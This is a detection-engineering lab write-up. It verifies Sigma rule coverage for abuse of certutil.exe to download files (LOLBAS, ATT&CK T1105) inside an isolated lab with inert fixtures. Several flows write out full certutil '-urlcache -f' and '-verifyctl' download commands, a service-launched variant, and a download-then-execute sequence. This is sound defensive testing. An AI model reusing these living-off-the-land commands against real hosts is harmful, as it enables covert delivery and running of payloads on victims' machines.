# Certutil remote-download scenarios

## Scope

- **VM 100 — `kalivm` — `192.168.1.50` — lab payload host.** It
  serves only the lab-authored fixtures in this verification over HTTP on TCP
  18081 and HTTPS on TCP 18443. Both listeners bind only to
  `192.168.1.50`. No payload, certificate, or stager is fetched from the
  internet or the management network.
- **VM 104 — `WIN10-ANALYSIS` — `192.168.1.52` — target.** Every
  scenario begins and ends with a rollback to `win_verify_baseline`. It runs
  the built-in Microsoft-signed `certutil.exe`; the only downloaded executable
  is the lab-authored inert marker PE described below.
- **VM 106 — `nsm` — `10.9.0.20` — offline analysis only.** It is
  never a scenario destination. `nsm-analyze` transfers each completed packet
  capture to this VM out of band for Zeek and Suricata analysis.
- **Destinations.** The only run destination is VM 100 at
  `192.168.1.50:18081` or `192.168.1.50:18443`. The internal name
  `certutil.lab` is mapped only to `192.168.1.50`. Every attack-activity
  destination is inside `192.168.1.0/24`; the management network and every
  public address or hostname are forbidden.
- **Packet and endpoint proof.** Every scenario has a separate full-packet
  `pktmon --pkt-size 0` capture and a separate endpoint collection window.
  Each capture is analyzed with `nsm-analyze`; the combined Zeek output and
  complete Sysmon EID 3 attribution are checked with
  `safety/check-lab-scope.py` after execution.
- **Runtime network isolation.** After each baseline start and before capture,
  VM 104's analysis adapter is reset to close pre-existing operating-system
  sessions, then its IPv4 and IPv6 default routes are removed and the host is
  allowed to quiesce. The directly connected `192.168.1.0/24` route remains,
  so Kali stays reachable while Windows background services have no route to
  public or management destinations. Snapshot rollback restores the baseline
  network configuration after each run.
- **Fixtures.** `benign-stage.txt` is lab-authored inert text. The marker PE is
  built from `fixtures/inert-marker.c` on Kali VM 100 with the installed MinGW
  compiler. It has no networking, persistence, process-spawning, privilege,
  or destructive behavior: it writes
  `C:\lab\download-execute-marker.txt` and exits. The PE is executed only in
  scenario 5. The source is reviewed directly; no third-party PoC or
  dependency is used.
- **External references and out-of-scope signals.** The LOLBAS, ATT&CK,
  SigmaHQ, and incident-report URLs below are citations only and are never
  contacted by a scenario. Public-domain reputation, public hosting history,
  internet destination rarity, and real-public-CA TLS signals are explicitly
  out of lab scope because Safety Rule 1 requires Kali-only delivery and
  forbids public download sources. The HTTPS scenario therefore proves TLS
  protocol and certificate telemetry for a lab self-signed certificate, not
  those production enrichment signals.

`certutil.exe` is a Microsoft-signed certificate utility. Its presence and
signature make it attractive for living-off-the-land transfer, but those same
properties mean legitimate PKI retrievals are expected false-positive cases.

## Verified flow 1: canonical `-urlcache -f` without `-split`

This run exercises the canonical LOLBAS **Ingress Tool Transfer (T1105)**
shape that the prior rule missed:

```text
C:\Windows\System32\certutil.exe -urlcache -f http://192.168.1.50:18081/benign-stage.txt C:\lab\urlcache-no-split.txt
```

The target downloads the inert text fixture over lab-only HTTP. The absence of
`-split` is intentional and is the main rule-regression test.

## Verified flow 2: `-verifyctl -f`

This separate T1105 run exercises the second documented retrieval verb:

```text
C:\Windows\System32\certutil.exe -verifyctl -f http://192.168.1.50:18081/benign-stage.txt C:\lab\verifyctl-download.txt
```

Success or failure of the subsequent content verification is recorded
honestly; the detection question is whether the retrieval form creates the
expected process, network, cache, and destination-file telemetry.

## Verified flow 3: service-context parent

The orchestrator creates a temporary demand-start service named
`CertutilLabDownload` whose `ImagePath` is the following bounded command:

```text
C:\Windows\System32\certutil.exe -urlcache -f http://192.168.1.50:18081/benign-stage.txt C:\lab\service-parent.txt
```

`sc.exe start CertutilLabDownload` asks the Service Control Manager to create
the certutil process. The expected parent is `services.exe`, not a shell or
script host. Certutil is not service-aware, so SCM may return error 1053 after
the child exits; download completion, hashes, and process telemetry determine
the run result. The service is deleted in the collection window and the final
snapshot rollback removes all service state.

## Verified flow 4: Kali-hosted HTTPS

Kali creates a lab-only self-signed certificate whose SAN is
`DNS:certutil.lab`. Before capture, the target maps that name to
`192.168.1.50` and trusts only that certificate for this disposable run. It
then fetches the same inert text fixture used in flows 1–3:

```text
C:\Windows\System32\certutil.exe -urlcache -f https://certutil.lab:18443/benign-stage.txt C:\lab\https-stage.txt
```

The pre- and post-run rollback removes the hosts entry and trust-store change.

## Verified flow 5: download then execute an inert PE

The marker executable is served by Kali over lab-only HTTP, downloaded with
the canonical form, and executed only if the transfer succeeds and its
SHA-256 equals the pre-recorded build hash:

```text
C:\Windows\System32\certutil.exe -urlcache -f http://192.168.1.50:18081/inert-marker.exe C:\lab\inert-marker.exe
C:\lab\inert-marker.exe
```

The only expected effect of execution is creation of
`C:\lab\download-execute-marker.txt`. This bounded validation provides the
download-to-process correlation that the earlier 3,768-byte text-only fixture
could not show: a PE image load/process start tied to the downloaded file, PE
metadata/hashes in process telemetry, and the marker file written by that
image. It does not model malware behavior or persistence.

## Coverage and future work

These five runs cover the grounded URL-cache-without-split, verifyctl,
service-parent, HTTP/HTTPS, text/PE, and download-followed-by-execution shapes.
The Sigma process rule also covers the documented `-URL` verb, but a dedicated
`-URL` execution remains future work because its cache-only semantics merit a
separate destination-file assessment. Alternate-data-stream destinations and
certificate-store manipulation remain separate future scenarios.

References: [LOLBAS Certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/),
[ATT&CK T1105](https://attack.mitre.org/techniques/T1105/),
[SigmaHQ Certutil Download](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_certutil_download.yml),
and the cited [ActiveMQ incident report](https://cybersecuritynews.com/threat-actors-exploit-apache-activemq-server-vulnerability/).
